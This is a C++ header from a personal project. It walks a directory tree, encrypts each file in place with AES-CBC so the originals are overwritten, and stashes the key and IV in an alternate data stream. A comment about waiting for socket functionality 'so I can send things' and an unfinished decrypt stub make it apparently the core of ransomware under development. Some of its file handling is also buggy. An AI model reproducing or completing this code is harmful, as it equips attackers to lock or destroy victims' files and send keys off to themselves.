// Code that only I use and that only I write (lars)
#pragma once
#include "includes.h"
using namespace CryptoPP;
namespace fs = std::filesystem;
namespace lars {
	namespace logic {
		std::string getUnixMS() {
			auto now = std::chrono::system_clock::now();
			auto duration = now.time_since_epoch();
			auto rawUnixMS = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
			return std::to_string(rawUnixMS);
		}
		SecByteBlock strToSbb(std::string str) {
			CryptoPP::SecByteBlock secBlock(reinterpret_cast<const byte*>(str.data()), str.size());
			return secBlock;
		}
		void collect_files(const fs::path& path, std::vector<fs::path>& file_paths) {
			try {
				if (fs::exists(path) && fs::is_directory(path)) {
					for (const auto& entry : fs::recursive_directory_iterator(path, fs::directory_options::skip_permission_denied)) {
						if (fs::exists(entry) && fs::is_regular_file(entry)) {
							file_paths.push_back(entry.path());
						}
					}
				}
				else {
					std::cerr << "Path does not exist or is not a directory." << std::endl;
				}
			}
			catch (const std::filesystem::filesystem_error& e) {
				std::cerr << "Filesystem error: " << e.what() << std::endl;
			}
		}
		bool isBinaryFile(const std::string& path) { // VERY helpful for encryption
			std::ifstream file(path, std::ios::binary);
			char ch;
			while (file.get(ch)) {
				if (!isprint(ch) && !isspace(ch)) {
					return true;
				}
			}
			return false;
		}
		std::vector<char> readBinary(std::ifstream& f_in) {
			f_in.unsetf(std::ios::skipws);
			std::streampos fileSize;
			f_in.seekg(0, std::ios::end);
			fileSize = f_in.tellg();
			f_in.seekg(0, std::ios::beg);
			std::vector<char> v;
			v.reserve(fileSize);
			v.insert(v.begin(),
				std::istream_iterator<char>(f_in),
				std::istream_iterator<char>());
			return v;
		}
		std::string readFile(std::ifstream& f_in) {
			std::string data = {};
			if (f_in.is_open()) {
				f_in >> data;
			}
			else {
				std::cerr << "File not found.";
			}
			return data;
		}
	}
	namespace aes { // Waiting for socket functionality, so I can send things
		void encrypt(std::string& path, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock IV) {
			std::ifstream f_in(path, std::ios::binary);
			std::vector<char> binaryData;
			bool binary = false;
			if (f_in.is_open()) {
				if (lars::logic::isBinaryFile(path)) {
					binary = true;
					binaryData = lars::logic::readBinary(f_in);
				}
				else {
					binary = false;
					lars::logic::readFile(f_in);
				}
				f_in.close();
			}
			else {
				std::cerr << "File error.";
				return;
			}
			
			if (binary) { // Binary files
				AES::Encryption e(key, AES::DEFAULT_KEYLENGTH);
				CBC_Mode_ExternalCipher::Encryption cbcAgent(e, IV);
				std::string cipher;
				CryptoPP::StreamTransformationFilter stfEncryptor(cbcAgent, new CryptoPP::StringSink(cipher));
				stfEncryptor.Put(reinterpret_cast<const unsigned char*>(&binaryData[0]), binaryData.size());
				stfEncryptor.MessageEnd();
				std::ofstream f_out(path, std::ios::binary);
				if (f_out.is_open()) {
					f_out.write(cipher.data(), cipher.size());
					f_out.close();
				}
				else {
					std::cerr << "File error.";
					return;
				}
			}

			else { // Plaintext files
				CBC_Mode<AES>::Encryption e;
				e.SetKeyWithIV(key, AES::DEFAULT_KEYLENGTH, IV);
				FileSource fs(path.c_str(), true,
					new StreamTransformationFilter(e,
						new FileSink(path.c_str())
					)
				);
			}
			std::stringstream s;
			s << key;
			s << IV;
			std::string keypair = s.str();
			std::stringstream ssasPath;
			ssasPath << path;
			ssasPath << ":keyandiv";
			std::string asPath = ssasPath.str();
			std::ofstream as(asPath);
			if (as.is_open()) {
				as << keypair;
			}
			as.close();
			return;
		}

		void decrypt() {
			std::cout << "W.I.P function";
			return;
		}
	}
}